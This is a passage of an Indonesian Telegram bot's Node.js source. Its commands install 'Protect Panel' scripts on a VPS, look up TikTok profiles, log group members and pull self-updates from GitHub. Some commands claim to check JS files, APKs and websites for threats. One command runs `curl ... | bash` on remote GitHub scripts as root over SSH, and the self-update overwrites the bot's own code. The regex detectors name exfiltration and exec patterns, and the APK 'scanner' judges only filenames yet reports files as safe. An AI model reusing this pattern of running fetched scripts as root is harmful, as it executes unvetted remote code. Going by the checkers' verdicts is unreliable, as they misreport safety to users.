        const script = scripts[i];
        const scriptURL = `https://raw.githubusercontent.com/Bealllevey62/mbut/main/${script}`;
        const stepMsg = await ctx.reply(`🚀 Memulai instalasi *${script}* (${i+1}/${scripts.length})...`, { parse_mode: 'Markdown' });

        await new Promise((resolve) => {
          let output = '';
          conn.exec(`curl -fsSL ${scriptURL} | bash`, (err, stream) => {
            if (err) {
              ctx.reply(`❌ Gagal mengeksekusi ${script}:\n\`${err.message}\``, { parse_mode: 'Markdown' });
              return resolve();
            }
            stream.on('data', (data) => { output += data.toString(); });
            stream.stderr.on('data', (data) => { output += `\n[ERROR] ${data.toString()}`; });
            stream.on('close', () => {
              const tailOutput = output.trim().slice(-3800) || '(tidak ada output)';
              ctx.reply(`✅ *${script}* selesai!\n📦 Output terakhir:\n\`\`\`${tailOutput}\`\`\``, { parse_mode: 'Markdown' });
              resolve();
            });
          });
        });
      }

      conn.end();
      await ctx.reply('🎉 Semua instalasi Protect Panel 1-9 selesai!', { parse_mode: 'Markdown' });
    });

    conn.on('error', async (err) => {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `❌ Gagal terhubung ke VPS!\nPeriksa IP & Password.\n\nError:\n\`${err.message}\``, { parse_mode: 'Markdown' });
    });

    conn.connect({
      host: ipvps,
      port: 22,
      username: 'root',
      password: pwvps
    });

  } catch (e) {
    console.error(e);
    ctx.reply('❌ Terjadi kesalahan saat memproses instalasi Protect Panel', { parse_mode: 'Markdown' });
  }
});

const userData = new Map();
bot.on("message", async (ctx, next) => {
  try {
    const now = new Date().toLocaleString("id-ID");

    if (!ctx.chat || !ctx.from) return next();
    if (ctx.chat.type === "private") {
      userData.set(ctx.from.id, {
        type: "Private",
        id: ctx.from.id,
        name: ctx.from.first_name || "Tanpa Nama",
        username: ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username",
        lastUsed: now,
      });
    }
    else if (["group", "supergroup"].includes(ctx.chat.type)) {
      let group = userData.get(ctx.chat.id);

      if (!group) {
        group = {
          type: "Group",
          id: ctx.chat.id,
          name: ctx.chat.title || "Tanpa Judul",
          username: ctx.chat.username ? `https://t.me/${ctx.chat.username}` : "Tidak ada link",
          members: new Map(),
          lastUsed: now,
        };
      }
      group.members.set(ctx.from.id, {
        id: ctx.from.id,
        name: ctx.from.first_name || "Tanpa Nama",
        username: ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username",
        lastUsed: now,
      });

      group.lastUsed = now;
      userData.set(ctx.chat.id, group);
    }
  } catch (err) {
    console.error("Error logging user/group data:", err);
  }
  return next();
});

// Command /cekbot
bot.command("cekbot", async (ctx) => {
if (checkResting(ctx)) return;
  try {
    if (userData.size === 0) {
      return ctx.reply("🤖 Belum ada data penggunaan bot yang tercatat.");
    }

    let privateList = "";
    let groupList = "";

    for (const [, info] of userData.entries()) {
      if (info.type === "Private") {
        privateList += `👤 <b>${info.name}</b> (${info.username})\n🆔 ID: <code>${info.id}</code>\n🕒 Terakhir digunakan: ${info.lastUsed}\n\n`;
      } else if (info.type === "Group") {
        let members = "";
        for (const [, user] of info.members.entries()) {
          members += `   • ${user.name} (${user.username})\n     🆔 <code>${user.id}</code>\n     🕒 ${user.lastUsed}\n`;
        }
        groupList += `👥 <b>${info.name}</b>\n🔗 Link: ${info.username}\n🆔 ID Grup: <code>${info.id}</code>\n🕒 Terakhir aktif: ${info.lastUsed}\n👥 Pengguna di grup:\n${members}\n\n`;
      }
    }

    let message = "<b>📊 Daftar Penggunaan Bot:</b>\n\n";
    if (privateList) message += `🏠 <b>Private Chat:</b>\n${privateList}\n`;
    if (groupList) message += `💬 <b>Group Chat:</b>\n${groupList}`;

    // Pecah pesan jika lebih dari 4096 karakter (limit Telegram)
    const chunkSize = 4000;
    for (let i = 0; i < message.length; i += chunkSize) {
      await ctx.reply(message.slice(i, i + chunkSize), { parse_mode: "HTML" });
    }

  } catch (err) {
    console.error("Error in /cekbot:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat menampilkan data penggunaan bot.");
  }
});

bot.command("play", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  const query = text.trim();
  const chatId = ctx.chat.id;

  if (!query) {
    return ctx.reply("❌ Contoh: /play mangu");
  }

  // Pesan loading
  const statusMsg = await ctx.reply(`⏳ Sedang mencari lagu *${query}* ...`, {
    parse_mode: "Markdown"
  });

  try {
    // API PLAY
    const API = `https://api.zenzxz.my.id/api/search/play?query=${encodeURIComponent(query)}`;
    const res = await axios.get(API);
    const json = res.data;

    if (!json.success || !json.data || !json.data.dl_mp3) {
      return ctx.telegram.editMessageText(
        chatId,
        statusMsg.message_id,
        undefined,
        `❌ Lagu *${query}* tidak ditemukan.`,
        { parse_mode: "Markdown" }
      );
    }

    const title = json.data.metadata.title || "Unknown Title";
    const thumb = json.data.metadata.thumbnail;
    const mp3 = json.data.dl_mp3;

    // Download MP3
    const tempFile = path.join(__dirname, `${uuidv4()}.mp3`);
    const stream = await axios.get(mp3, { responseType: "stream" });
    const writer = fs.createWriteStream(tempFile);
    stream.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Update pesan loading
    await ctx.telegram.editMessageText(
      chatId,
      statusMsg.message_id,
      undefined,
      `🎶 Menyiapkan audio *${title}* ...`,
      { parse_mode: "Markdown" }
    );

    // Kirim thumbnail
    await ctx.replyWithPhoto(thumb, {
      caption: `🎵 *${title}*`,
      parse_mode: "Markdown"
    });

    // Kirim audio
    await ctx.replyWithAudio(
      { source: tempFile },
      {
        title: title,
        performer: "Unknown",
        caption: `🎧 *${title}*`,
        parse_mode: "Markdown",
        thumb: thumb
      }
    );

    fs.unlinkSync(tempFile);

    // Hapus pesan status
    await ctx.telegram.deleteMessage(chatId, statusMsg.message_id);

  } catch (err) {
    console.error("PLAY ERROR:", err.message);

    ctx.telegram.editMessageText(
      chatId,
      statusMsg.message_id,
      undefined,
      "❌ Terjadi kesalahan saat mengambil lagu."
    );
  }
});

bot.command("stalktiktok", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  if (!menuEnabled) {
    return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
  }

  if (!tokenValidated) {
    return;
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply(
      "⚠️ Masukkan username TikTok.\n\nContoh:\n/stalktiktok mrbeast",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await ctx.reply("⏳ Sedang mengambil data TikTok...");

    const res = await axios.get(
      `https://api.siputzx.my.id/api/stalk/tiktok?username=${encodeURIComponent(text)}`
    );
    const data = res.data;

    if (!data.status || !data.data) {
      return ctx.reply("❌ User TikTok tidak ditemukan.");
    }

    const user = data.data.user;
    const stats = data.data.stats;

    const caption = `
⟢ *TikTok Stalk Result*
──────────────────────
✦ ID: ${user.id}
✦ Username: ${user.uniqueId}
✦ Nickname: ${user.nickname}
✦ Verified: ${user.verified ? "✅ Yes" : "❌ No"}
✦ Bio: ${user.signature || "-"}
✦ Link: ${user.bioLink?.link || "-"}

⟢ *Stats*
──────────────────────
✦ Followers: ${stats.followerCount.toLocaleString()}
✦ Following: ${stats.followingCount.toLocaleString()}
✦ Likes: ${stats.heartCount.toLocaleString()}
✦ Videos: ${stats.videoCount.toLocaleString()}
    `.trim();

    await ctx.replyWithPhoto(
      { url: user.avatarLarger },
      {
        caption,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("TikTok Stalk Error:", err);
    ctx.reply("❌ Gagal mengambil data TikTok. Silakan coba lagi nanti.");
  }
});

bot.command("efekfunc", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("⚠️ Balas potongan kode atau file `.js` yang ingin dianalisis.\nContoh: /efekfunc (balas function atau file.js)");

    // Ambil kode (dari file .js atau teks reply)
    let code = "";
    if (reply.document) {
      const file = reply.document;
      if (!file.file_name.endsWith(".js")) return ctx.reply("❌ File harus berformat .js");
      const link = await ctx.telegram.getFileLink(file.file_id);
      const res = await fetch(link.href);
      code = await res.text();
    } else if (reply.text) {
      code = reply.text;
    } else {
      return ctx.reply("⚠️ Balas teks function atau file `.js`.");
    }

    await ctx.reply("🔎 Analisa cepat efek (simple) — tunggu sebentar...");

    // DETEKTOR SEDERHANA (regex)
    const detectors = [
      { label: "Delay / Invisible", re: /\bwhile\s*\(\s*true\s*\)|for\s*\(\s*;\s*;\s*\)|setInterval\s*\(|setTimeout\s*\(\s*.*,\s*0\s*\)/i },
      { label: "Crash", re: /\bprocess\.exit\b|\bprocess\.kill\b|\bthrow\s+new\s+Error\b|\bthrow\b/i },
      { label: "Spam / Mass Mention", re: /\bmentionJidList\b|\bStatusJidList\b|\bbroadcast\b|\bforEach\([^)]*sendMessage\b/i },
      { label: "Exfiltrate / Network", re: /\bfetch\s*\(|\baxios\b|https?:\/\/[^\s'"]+/i },
      { label: "Obfuscation / Eval", re: /eval\s*\(|new\s+Function\b|\\x[0-9A-Fa-f]{2}|atob\(|btoa\(|toString\('base64'\)/i },
      { label: "Filesystem / Write", re: /\bfs\.(writeFile|appendFile|writeFileSync|createWriteStream)\b/i },
      { label: "Child Process / Exec", re: /\b(exec|execSync|spawn|spawnSync|child_process)\b/i },
      { label: "WhatsApp Payload", re: /generateWAMessageFromContent|status@broadcast|mentionJidList|StatusJidList/i }
    ];

    // jalankan detektor
    const found = [];
    detectors.forEach(d => {
      if (d.re.test(code)) found.push(d.label);
    });

    // Susun output sederhana
    const mainEffects = found.slice(0, 3); // ambil sampai 3 label
    const effectText = mainEffects.length ? mainEffects.join(" • ") : "No Suspicious Effect";

    // Keterangan singkat per label (map)
    const hints = {
      "Delay / Invisible": "Loop tak terbatas atau setTimeout/setInterval dengan delay kecil → bisa menyebabkan lag/invisible.",
      "Crash": "Pemanggilan process.exit/process.kill atau throw → berpotensi force-exit/crash.",
      "Spam / Mass Mention": "Pattern broadcast/mention → berisiko spam/mass-mention.",
      "Exfiltrate / Network": "Ada fetch/axios/URL → mungkin mengirim data ke server eksternal.",
      "Obfuscation / Eval": "Ada eval/new Function/encoding → sulit dianalisis, berpotensi berbahaya.",
      "Filesystem / Write": "Menulis file lokal → cek path & isi, bisa overwrite data.",
      "Child Process / Exec": "Memanggil exec/spawn → jalankan perintah OS, sangat sensitif.",
      "WhatsApp Payload": "Pattern WA payload/status → kemungkinan exploit / flood via status."
    };

    // Ambil 1–2 saran singkat
    const suggestions = [];
    if (mainEffects.includes("Delay / Invisible")) suggestions.push("Tambahkan batas pada loop / gunakan async batching.");
    if (mainEffects.includes("Crash")) suggestions.push("Hentikan pemanggilan exit/kill dari input tak tepercaya; tangani error dengan try-catch.");
    if (mainEffects.includes("Spam / Mass Mention")) suggestions.push("Tambahkan rate-limit dan validasi target.");
    if (mainEffects.includes("Exfiltrate / Network")) suggestions.push("Periksa endpoint dan jangan kirim token/secret.");
    if (mainEffects.includes("Obfuscation / Eval")) suggestions.push("Hindari eval; gunakan parser atau fungsi aman.");
    if (mainEffects.includes("Filesystem / Write")) suggestions.push("Validasi path & gunakan permission yang aman.");
    if (mainEffects.includes("Child Process / Exec")) suggestions.push("Jangan jalankan perintah OS dari input pengguna.");
    if (mainEffects.includes("WhatsApp Payload")) suggestions.push("Audit payload WA; batasi mentions dan ukuran media.");

    // Siapkan snippet (baris sekitar deteksi pertama) — simple: cari baris pertama match
    let snippet = "—";
    const firstMatch = detectors.find(d => d.re.test(code));
    if (firstMatch) {
      const lines = code.split("\n");
      // cari index baris yang match
      const idx = lines.findIndex(l => firstMatch.re.test(l));
      if (idx >= 0) {
        const start = Math.max(0, idx - 2);
        const end = Math.min(lines.length, idx + 3);
        snippet = lines.slice(start, end).map((l, i) => `${start + i + 1 === idx + 1 ? "👉 " : "   "}${String(start + i + 1).padEnd(4)}| ${l}`).join("\n");
      }
    }

    // final report (sederhana)
    const report = [
      `🧠 *Analisa Efek (simple)*`,
      `📁 Sumber: ${reply.document ? reply.document.file_name : "potongan teks (reply)"}`,
      ``,
      `🔎 *Efek Teridentifikasi:* ${effectText}`,
      ``,
      `🔍 *Indikator yang ditemukan:* ${found.length ? found.join(", ") : "—"}`,
      ``,
      `📘 *Cuplikan (sekitar indikasi pertama):*`,
      "```js",
      snippet,
      "```",
      ``,
      `💡 *Saran singkat:*`,
      suggestions.length ? suggestions.map(s => `• ${s}`).join("\n") : "• Tidak ada saran khusus; lakukan review manual.",
      ``,
      `🧾 *Catatan:* Analisis ini *sederhana* (pattern-based). Untuk hasil lebih mendalam gunakan versi lengkap.`
    ].join("\n");

    // Kirim hasil (jika panjang, kirim file)
    if (report.length > 4000) {
      const tmp = path.join(__dirname, "efekfunc_simple.txt");
      fs.writeFileSync(tmp, report);
      await ctx.replyWithDocument({ source: tmp, filename: "efekfunc_simple.txt" });
      fs.unlinkSync(tmp);
    } else {
      await ctx.replyWithMarkdown(report, { disable_web_page_preview: true });
    }

  } catch (err) {
    console.error("efekfunc simple error:", err);
    return ctx.reply(`❌ Terjadi kesalahan: ${err.message}`);
  }
});

bot.command("cekerror", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const reply = ctx.message.reply_to_message;
  if (!reply?.document) {
    return ctx.reply("⚠️ Balas file `.js` yang ingin dicek!\nContoh:\n/cekerror (balas file.js)");
  }

  const file = reply.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.reply("❌ File harus berformat `.js`!");
  }

  await ctx.reply("🔍 Sedang menganalisis file JavaScript...");

  const fileLink = await ctx.telegram.getFileLink(file.file_id);
  const res = await fetch(fileLink.href);
  const code = await res.text();

  let syntaxError = null;
  let errorLine = 0, errorColumn = 0;
  let functions = [], commands = [], protections = [];
  let runtimeError = "—";
  let suggestion = [];

  try {
    const tree = acorn.parse(code, {
      ecmaVersion: "latest",
      sourceType: "module",
      locations: true
    });

    walk.simple(tree, {
      FunctionDeclaration(node) {
        if (node.id?.name) functions.push(node.id.name);
      },
      CallExpression(node) {
        if (node.callee?.object?.name === "bot" && node.callee?.property?.name === "command") {
          const cmdArg = node.arguments?.[0]?.value;
          if (cmdArg) commands.push("/" + cmdArg);
        }
      }
    });
  } catch (err) {
    syntaxError = err.message;
    errorLine = err.loc?.line || 0;
    errorColumn = err.loc?.column || 0;
  }

  // Cek proteksi
  const lower = code.toLowerCase();
  if (lower.includes("debugger")) protections.push("🧠 Anti-Debug aktif");
  if (lower.includes("process.exit")) protections.push("⚔️ Process Kill Protection");
  if (lower.includes("eval(")) protections.push("🕵️ Eval Lock / Dynamic Eval");
  if (lower.includes("checksum")) protections.push("🔐 Checksum Validation");
  if (lower.includes("hwid")) protections.push("💻 HWID Lock System");
  if (lower.includes("antidebug")) protections.push("🧩 Anti-Bypass / Anti-Debug Detected");

  // Simulasi runtime error sederhana
  try {
    new Function(code);
  } catch (err) {
    runtimeError = err.message;
  }

  // Saran otomatis
  if (syntaxError) {
    if (syntaxError.includes("Unexpected token")) suggestion.push("Periksa tanda kurung, koma, atau kurung kurawal yang tidak ditutup.");
    if (syntaxError.includes("has already been declared")) suggestion.push("Hapus deklarasi ganda pada variabel atau function yang sama.");
    if (syntaxError.includes("Unexpected end")) suggestion.push("Pastikan semua blok kode `{}` sudah ditutup dengan benar.");
  }

  const snippet = (() => {
    if (!syntaxError || !errorLine) return "—";
    const lines = code.split("\n");
    const start = Math.max(errorLine - 2, 0);
    const end = Math.min(errorLine + 2, lines.length);
    return lines.slice(start, end)
      .map((l, i) => `${start + i + 1 === errorLine ? "👉 " : ""}${String(start + i + 1).padEnd(5)}| ${l}`)
      .join("\n");
  })();

  const report = `
💥 *Error Syntax Ditemukan:*
${syntaxError ? `🔴 *${syntaxError}*\n📍 *Baris:* ${errorLine}:${errorColumn}\n📘 *Cuplikan Kode:*\n\`\`\`js\n${snippet}\n\`\`\`` : "✅ Tidak ditemukan error syntax."}

💥 *Error Runtime*
\`\`\`
${runtimeError || "Tidak ada error runtime"}
\`\`\`

💡 *Saran Perbaikan:*
${suggestion.map(s => "• " + s).join("\n") || "Tidak ada saran perbaikan."}

📊 *Analisis Tambahan:*
📦 *Total Function:* ${functions.length}
⚙️ *Command Bot:* ${commands.length}
🔒 *Proteksi Aktif:* ${protections.length ? protections.join("\n") : "—"}

🧩 *Daftar Function (maks 10):*
${functions.slice(0, 10).map(f => "• " + f).join("\n") || "—"}

⚙️ *Command Terdeteksi:*
${commands.slice(0, 10).map(c => "• " + c).join("\n") || "—"}
`;

  await ctx.replyWithMarkdown(report);
});

bot.command("openfile", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const reply = ctx.message.reply_to_message;
  if (!reply?.document) {
    return ctx.reply("⚠️ Balas file `.zip` yang ingin dibuka!\nContoh:\n/openfile (balas file.zip)");
  }

  const file = reply.document;
  if (!file.file_name.endsWith(".zip")) {
    return ctx.reply("❌ File harus berformat `.zip`!");
  }

  await ctx.reply("📦 Sedang membuka file ZIP...");

  try {
    // Ambil file ZIP dari Telegram
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);

    // 🔧 FIX: Gunakan arrayBuffer agar kompatibel di node-fetch v3+
    const arrayBuffer = await res.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    // Simpan sementara ZIP
    const tempZip = path.join(__dirname, "temp_openfile.zip");
    fs.writeFileSync(tempZip, buffer);

    // Ekstrak ZIP
    const zip = new AdmZip(tempZip);
    const entries = zip.getEntries();

    if (entries.length === 0) {
      fs.unlinkSync(tempZip);
      return ctx.reply("📁 File ZIP kosong atau tidak memiliki isi yang bisa dibaca.");
    }

    await ctx.reply(`📂 ZIP berisi *${entries.length}* file. Mengirim satu per satu...`, { parse_mode: "Markdown" });

    // Kirim isi ZIP satu per satu
    for (const entry of entries) {
      if (entry.isDirectory) continue;
      const content = entry.getData();
      const tempPath = path.join(__dirname, "temp_" + entry.entryName.replace(/\//g, "_"));

      fs.writeFileSync(tempPath, content);
      await ctx.replyWithDocument({ source: tempPath, filename: entry.entryName });

      fs.unlinkSync(tempPath);
    }

    fs.unlinkSync(tempZip);
    await ctx.reply("✅ Semua file dari ZIP berhasil dikirim!");
  } catch (err) {
    console.error(err);
    await ctx.reply(`❌ Gagal membuka ZIP:\n${err.message}`);
  }
});

bot.command("ceksecurity", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const reply = ctx.message.reply_to_message;

  if (!reply?.document) {
    return ctx.reply(
      "⚠️ Balas file `.js` yang ingin dianalisis!\nContoh:\n/ceksecurity (reply file.js)"
    );
  }

  const file = reply.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.reply("❌ File harus berformat `.js`!");
  }

  await ctx.reply(" Menganalisis sistem keamanan... mohon tunggu 🔍");

  try {
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);
    const code = await res.text();

    // 🧩 Deteksi fitur keamanan
    const detect = {
      // Obfuscation
      obf_zeroWidth: /[\u200b\u200c\u200d\u2060\uFEFF]/.test(code),
      obf_rc4: /rc4|ARC4|rot13/i.test(code),
      obf_base64: /Buffer\.from|atob|btoa|base64/i.test(code),
      obf_hexString: /\\x[0-9A-Fa-f]{2}/.test(code),
      obf_stringArray: /var _0x[a-f0-9]+/.test(code),

      // Anti-debug / eval
      anti_debug: /(debugger|process\.abort|process\.kill|anti[-_]?debug|while\s*\(\s*true\s*\)\s*\{.*debugger)/i.test(code),
      anti_eval: /(eval\(|Function\(|anti[-_]?eval|patchEval|blockEval)/i.test(code),
      anti_hook: /(defineProperty|Proxy|anti[-_]?hook|hook[-_]?runtime)/i.test(code),
      anti_console: /(console\.log\s*=\s*|console\s*=\s*\{\})/i.test(code),
      anti_process_patch: /(process\.exit\s*=\s*|patchProcess|overrideProcessExit)/i.test(code),

      // Integrity / Checksum
      checksum: /(checksum|hash|crypto\.createHash|integrityCheck|verifyHash)/i.test(code),
      filesize: /(fs\.statSync|fileSizeCheck|fileLength|tamperCheck)/i.test(code),

      // Anti-bypass / runtime protection
      anti_proxy: /(axios\.interceptors|proxyBypass|proxyDetect|axios\.defaults\.proxy)/i.test(code),
      runtime_monitor: /(setInterval\(.*checksum|runtimeValidator|loopCheck|periodicCheck)/i.test(code),
      logic_trap: /(throw new Error|fakeProgress|trapFunction|antiBypassTrap)/i.test(code),

      // Telegram alert system
      telegram_alert: /(sendMessage|axios\.post.*telegram|bot\.sendMessage|7991917273)/i.test(code),

      // License / Expired / HWID
      license_check: /(license|keyAuth|tokenCheck|authServer)/i.test(code),
      hwid_lock: /(os\.hostname|networkInterfaces|HWID|macAddress)/i.test(code),
      expired: /(Date\.now|expired|expiry|validUntil)/i.test(code),
      kill_switch: /(killSwitch|remoteKill|shutdown|selfDestruct)/i.test(code),

      // Defense & anti-crack layer
      defense_mode: /(Xatanical|Rosemary|Aphrodite|Defense\s*v\d+)/i.test(code),
      anti_crack: /(antiCrack|antiBypass|antiTamper|crackDetect|process\.pid)/i.test(code),
      dummy_decoy: /(fakeVar|decoy|dummyFunction|noiseArray)/i.test(code),
    };

    // 🧮 Hitung skor keamanan
    const score = Object.values(detect).filter(Boolean).length;
    const total = Object.keys(detect).length;
    const percent = Math.round((score / total) * 100);

    // 🧾 Susun laporan
    const laporan = `
 *LAPORAN ANALISIS KEAMANAN JS* 

 *Obfuscation*
• ZeroWidth: ${detect.obf_zeroWidth ? "✅" : "❌"}
• RC4/XOR: ${detect.obf_rc4 ? "✅" : "❌"}
• Base64/Buffer: ${detect.obf_base64 ? "✅" : "❌"}
• Hex String: ${detect.obf_hexString ? "✅" : "❌"}
• String Array: ${detect.obf_stringArray ? "✅" : "❌"}

🧩 *Proteksi Runtime*
• Anti-Debug: ${detect.anti_debug ? "✅" : "❌"}
• Anti-Eval: ${detect.anti_eval ? "✅" : "❌"}
• Anti-Hook: ${detect.anti_hook ? "✅" : "❌"}
• Anti-Console: ${detect.anti_console ? "✅" : "❌"}
• Anti-Process Patch: ${detect.anti_process_patch ? "✅" : "❌"}

🧬 *Integrity & Bypass Defense*
• Checksum/Hash: ${detect.checksum ? "✅" : "❌"}
• FileSize / Tamper: ${detect.filesize ? "✅" : "❌"}
• Anti-Proxy: ${detect.anti_proxy ? "✅" : "❌"}
• Runtime Monitor: ${detect.runtime_monitor ? "✅" : "❌"}
• Logic Trap: ${detect.logic_trap ? "✅" : "❌"}

 *Alert & License System*
• Telegram Alert: ${detect.telegram_alert ? "✅" : "❌"}
• License/KeyAuth: ${detect.license_check ? "✅" : "❌"}
• HWID Lock: ${detect.hwid_lock ? "✅" : "❌"}
• Expired System: ${detect.expired ? "✅" : "❌"}
• Kill Switch: ${detect.kill_switch ? "✅" : "❌"}

 *ANTI BYPASS CHECK*
• Defense Mode: ${detect.defense_mode ? "✅" : "❌"}
• Bypass: ${detect.anti_crack ? "✅" : "❌"}
• Decoy: ${detect.dummy_decoy ? "✅" : "❌"}

══════════════════════════
🔐 *Skor Keamanan:* ${percent}/100
${
  percent >= 85
    ? "🟢 *Proteksi Sangat Kuat (Professional Grade)*"
    : percent >= 60
    ? "🟡 *Proteksi Menengah (Standard Security)*"
    : "🔴 *Proteksi Lemah / Hampir Tidak Ada*"
}
══════════════════════════
`;

    await ctx.replyWithMarkdown(laporan);
  } catch (err) {
    await ctx.reply(`❌ Gagal membaca file: ${err.message}`);
  }
});

/*bot.command("cekerror", async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply?.document) {
    return ctx.reply("⚠️ Balas file `.js` yang ingin dicek error!\nContoh:\n/cekerror (reply file.js)");
  }

  const file = reply.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.reply("❌ File harus berformat `.js`!");
  }

  await ctx.reply("🔍 Sedang menganalisa file...");

  try {
    // ambil file dari telegram
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);
    const code = await res.text();

    try {
      // parsing syntax pakai acorn
      acorn.parse(code, { ecmaVersion: "latest" });
      await ctx.reply("✅ Tidak ditemukan error syntax! File kamu aman dijalankan.");
    } catch (err) {
      // dapatkan baris & kolom error
      const { loc, message } = err;
      const lines = code.split("\n");
      const errorLine = lines[loc.line - 1] || "";
      const markedLine = `> ${errorLine}\n${" ".repeat(loc.column)}⬆️ [Error di sini]`;

      const report = `
❌ *Error ditemukan!*
🧠 *Jenis:* ${message.split(":")[0]}
📍 *Baris:* ${loc.line}
🧩 *Keterangan:* ${message}

\`\`\`js
${markedLine}
\`\`\`
`;
      await ctx.replyWithMarkdown(report);
    }
  } catch (e) {
    await ctx.reply(`❌ Gagal membaca file: ${e.message}`);
  }
});*/

bot.command("cekapk", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  ctx.reply("📦 Silakan kirim file APK yang ingin diperiksa.");

  bot.on("document", async (ctx) => {
    const file = ctx.message.document;

    if (!file.file_name.endsWith(".apk")) {
      return ctx.reply("⚠️ Hanya file .apk yang bisa diperiksa.");
    }

    const fileName = file.file_name.toLowerCase();
    const fileSize = file.file_size;

    // Analisis dasar
    let risiko = [];
    if (fileSize > 1000 * 1024 * 1024)
      risiko.push("⚠️ Ukuran file terlalu besar (kemungkinan packed)");
    if (fileName.includes("mod") || fileName.includes("hack"))
      risiko.push("❌ Mengandung indikasi modifikasi ilegal");
    if (fileName.includes("spy") || fileName.includes("steal"))
      risiko.push("❌ Memiliki spyware atau trojan");
    if (fileName.includes("bank") && fileName.includes("clone"))
      risiko.push("❌ APK berpotensi phising");

    // Simulasi hasil analisis (bisa dikembangkan pakai API VirusTotal)
    let keamanan;
    if (risiko.length === 0) {
      keamanan = "✅ Aman - Tidak ditemukan potensi berbahaya.";
    } else if (risiko.length <= 2) {
      keamanan = "⚠️ Berisiko - Ada indikasi mencurigakan.";
    } else {
      keamanan = "❌ Berbahaya - Disarankan jangan diinstal!";
    }

    const hasil = `
🧠 *Analisis APK:*
📂 Nama: ${file.file_name}
💾 Ukuran: ${(fileSize / 1024 / 1024).toFixed(2)} MB
🔎 Status: ${keamanan}

${
  risiko.length
    ? "📋 *Detail Temuan:*\n" + risiko.join("\n")
    : "✅ Tidak ada tanda-tanda berbahaya ditemukan."
}

🛡️ *Analisis Otomatis by Tredict Invictus System*
`;

    ctx.reply(hasil, { parse_mode: "Markdown" });
  });
});

const GITHUB_REPO = "Bealllevey62/clover";
const GITHUB_BRANCH = "main";

bot.command("pullupdate", async (ctx) => {
   try {
        ctx.reply("⏳ Auto Update Script Mohon Tunggu");
        const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/clover.js?ref=${GITHUB_BRANCH}`;
        const res = await fetch(apiURL, {
            headers: {
                "User-Agent": "Telegram-Bot",
                "Accept": "application/vnd.github.v3+json"
            }
        });

        if (!res.ok) return ctx.reply("❌ Belum Ada Update Dari Owner.");

        const data = await res.json();

        if (!data.content) return ctx.reply("❌ File clover.js tidak ditemukan.");
        const fileDecoded = Buffer.from(data.content, "base64").toString("utf8");

        // Replace file lokal
        fs.writeFileSync("./clover.js", fileDecoded);

        ctx.reply("✅ Script Berhasil Di Update\n♻️ Restarting bot");
       // Restart bot
        setTimeout(() => process.exit(1), 1500);
   } catch (err) {
        console.error(err);
        ctx.reply("❌ Tidak Ada Update Dari Owner.");
    }
});

bot.command("cekweb", async (ctx) => {
if (checkResting(ctx)) return;
  const input = ctx.message.text.split(" ")[1];
  if (!input) {
    return ctx.reply(
      "🌐 Silakan kirim link website yang ingin diperiksa.\n\nContoh: `/cekweb https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  const url = input.startsWith("http") ? input : `https://${input}`;
  await ctx.reply("🔍 Sedang memeriksa keamanan website, tunggu sebentar...");

  try {
    const response = await axios.get(url, {
      timeout: 8000,
      maxRedirects: 5,
      validateStatus: () => true,
    });

    const html = response.data;
    const status = response.status;
    const $ = cheerio.load(html);

    let risiko = [];

    // 1. Cek HTTPS
    if (!url.startsWith("https://")) {
      risiko.push("⚠️ Website tidak menggunakan HTTPS (kurang aman).");
    }

    // 2. Cek redirect mencurigakan
    if (status >= 300 && status < 400) {
      risiko.push("⚠️ Website melakukan redirect (kemungkinan cloaking/phising).");
    }

    // 3. Cek kata kunci mencurigakan
    const lowerHtml = html.toLowerCase();
    const keywordPhising = ["login", "bank", "password", "paypal", "verification", "update info", "credential"];
    const keywordHack = ["hack", "steal", "keylogger", "token", "grabber"];

    if (keywordPhising.some((w) => lowerHtml.includes(w)))
      risiko.push("❌ Mengandung elemen phising atau permintaan data sensitif.");
    if (keywordHack.some((w) => lowerHtml.includes(w)))
      risiko.push("❌ Mengandung script mencurigakan (hack/steal/grabber).");

    // 4. Cek script eksternal mencurigakan
    const scripts = [];
    $("script").each((i, el) => {
      const src = $(el).attr("src");
      if (src && (src.includes("tracking") || src.includes("ads") || src.includes("click") || src.includes("spy"))) {
        scripts.push(src);
      }
    });
    if (scripts.length > 0) {
      risiko.push(`⚠️ Terdapat script mencurigakan:\n${scripts.map((s) => "• " + s).join("\n")}`);
    }

    // 5. Hasil akhir
    let keamanan;
    if (risiko.length === 0) {
      keamanan = "✅ Aman - Tidak ditemukan indikasi berbahaya.";
    } else if (risiko.length <= 2) {
      keamanan = "⚠️ Berisiko - Ada indikasi mencurigakan.";
    } else {
      keamanan = "❌ Berbahaya - Disarankan jangan diakses!";
    }

    const hasil = `
🧠 *Analisis Website:*
🌍 URL: ${url}
📡 Status: ${status}
🔎 Keamanan: ${keamanan}

${
  risiko.length
